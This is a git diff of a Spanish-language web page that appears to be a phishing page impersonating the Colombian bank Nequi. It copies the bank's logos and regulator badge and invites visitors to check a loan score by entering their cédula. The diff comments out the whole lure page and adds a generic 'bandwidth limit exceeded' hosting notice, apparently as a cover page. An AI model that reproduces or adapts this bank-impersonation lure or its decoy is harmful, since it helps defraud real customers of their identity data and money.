@@ -1,3 +1,4 @@
+<!--
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -25,7 +26,6 @@
   </a>
 <a class="btn-recarga " href="https://recarga.nequi.com.co/bdigitalpsl"   >Recarga</a>
 
-  <!-- MENÚ MOBILE -->
   <button class="btn-menu" aria-label="Abrir menú">
     <span></span>
     <span></span>
@@ -34,10 +34,10 @@
 </header>
 
 
-<!-- OVERLAY -->
+
 <div class="menu-overlay" id="menuOverlay"  ></div>
 
-<!-- MENU LATERAL -->
+
 <aside class="mobile-menu" id="mobileMenu" style="z-index: 9999;" >
   <button class="close-menu" id="closeMenu">✕</button>
 
@@ -50,7 +50,6 @@
   <main class="main">
   
 
-  <!-- CARD -->
   <div class="login-card" id="form-consulta" >
       <h2>Consulta tu puntaje</h2>
       <p>Podrás hacer tu prestamo propulsor de acuerdo a tu puntaje.</p>
@@ -72,11 +71,6 @@
         <input id="cedula01" type="text" placeholder="Cedula">
       </div>
 
-      <!-- <div class="checkbox-card">
-        <div class="circle"></div>
-        <span>Confirmo que soy una persona real.</span>
-      </div> -->
-
 
       <button class="btn-enter" id="btn-consultar"  style="background-color: #DA0081;" >Enviar</button>
       <p style="padding-top: 10px; font-size: 10px; " >si tienes alguna duda o requieres de ayuda visita nuestro centro de ayudas.</p>
@@ -89,46 +83,6 @@
 
 
 
-
-<!-- 
-
-    <div class="card-resultado" id="resultado-prestamo" style="display: none;" >
-  <h2 class="card-title">Resultado de tu consulta</h2>
-  
-  <div class="result-container">
-    <div class="result-row">
-      <span>Cantidad a prestar:</span>
-      <span class="value highlight">$2.400.000 COP</span>
-    </div>
-    <div class="result-row">
-      <span>Meses de plazo:</span>
-      <span class="value">12</span>
-    </div>
-    <div class="result-row">
-      <span>Interés mensual:</span>
-      <span class="value">$11,000</span>
-    </div>
-    <div class="result-row total">
-      <span>Pago total:</span>
-      <span class="value">$2.532.000</span>
-    </div>
-    <div class="result-row quota">
-      <span>Cuota mensual:</span>
-      <span class="value">$211.000</span>
-    </div>
-  </div>
-
-  <div class="input-group">
-    <label for="plazo">Seleccione el plazo:</label>
-    <select id="plazo" class="custom-select">
-      <option value="12">12 meses</option>
-     
-    </select>
-  </div>
-
-<button class="btn-continuar" id="btn-continuar" style="background-color: #DA0081;" >Continuar</button>
-
-</div> -->
 
 
 
@@ -188,10 +142,8 @@
 
 
 <footer class="footer"   >
-  <!-- IMAGEN VERTICAL VIGILADO -->
- 
-<!-- VIGILADO SUPERINTENDENCIA -->
-<!-- VIGILADO SUPERINTENDENCIA -->
+
+
 <img
   src="/images/vigilado.png"
   alt="Vigilado Superintendencia Financiera de Colombia"
@@ -202,7 +154,7 @@
 
   <div class="footer-bg">
 
-    <!-- TOP -->
+    
     <div class="footer-top">
       <img src="/images/64e50b03c9fda96db04be382_logo-nequi-blanco.svg" alt="Nequi" class="footer-logo">
 
@@ -221,7 +173,7 @@
 
 
 
-    <!-- LINKS -->
+
 <div class="footer-links">
 
   <div class="footer-item">
@@ -281,7 +233,7 @@
 
 <div class="footer-line " id="x" ></div>
 
-<!-- SOCIAL -->
+ 
 <div class="footer-social"  >
   <a href="#"><img src="/images/64e5220142aa063fa007c444_ic-twitter.svg"></a>
   <a href="#"><img src="/images/64e52201416719efe915e448_ic-instagram.svg"></a>
@@ -340,3 +292,126 @@
 
 
 </html>
+ -->
+
+
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Límite de ancho de banda excedido</title>
+
+<style>
+    body {
+        margin: 0;
+        font-family: Arial, Helvetica, sans-serif;
+        background: #fdfeff;
+        color: #000000;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+    }
+
+    .container {
+        max-width: 750px;
+        width: 95%;
+        background: #ffffff;
+        border: 1px solid #1f2937;
+        border-radius: 16px;
+        padding: 40px 30px;
+        text-align: center;
+        box-shadow: 0 0 40px rgba(0,0,0,0.6);
+    }
+
+    .logo img {
+        max-width: 260px;
+        margin-bottom: 30px;
+    }
+
+    h1 {
+        color: #000000;
+        font-size: 2.2rem;
+        margin-bottom: 20px;
+    }
+
+    p {
+        color: #1b1b1b;
+        font-size: 1.05rem;
+        line-height: 1.7;
+        margin-bottom: 18px;
+    }
+
+    .alert-box {
+        background: #ff6600;
+        border: 1px solid #1e293b;
+        border-radius: 12px;
+        padding: 20px;
+        margin: 25px 0;
+        color: #ffffff;
+    }
+
+    .btn {
+        display: inline-block;
+        margin-top: 15px;
+        padding: 14px 28px;
+        background: #ff6600;
+        color: #ffffff;
+        text-decoration: none;
+        border-radius: 10px;
+        font-weight: bold;
+        transition: 0.2s;
+    }
+
+    .btn:hover {
+        background: #0ea5e9;
+    }
+
+    footer {
+        margin-top: 30px;
+        font-size: 0.85rem;
+        color: #64748b;
+    }
+</style>
+</head>
+
+<body>
+    <div class="container">
+
+        <div class="logo">
+            
+            <img src="logo.png" alt="Logo">
+        </div>
+
+        <h1>Has superado el límite de ancho de banda</h1>
+
+        <p>
+            El sitio web ha excedido la cuota mensual de transferencia de datos permitida por el plan actual.
+        </p>
+
+        <div class="alert-box">
+            Para restaurar el servicio puedes:
+            <br><br>
+            • Actualizar tu plan de hosting desde el panel de cliente.  
+            <br>
+            • Comprar más ancho de banda adicional.  
+            <br>
+            • Extender el período de servicio activo.  
+        </div>
+
+        <p>
+            Una vez realizado el ajuste, el acceso al sitio será restablecido automáticamente.
+        </p>
+
+      
+
+        <footer>
+            © 2026 - Todos los derechos reservados.
+        </footer>
+
+    </div>
+</body>
+</html>
+
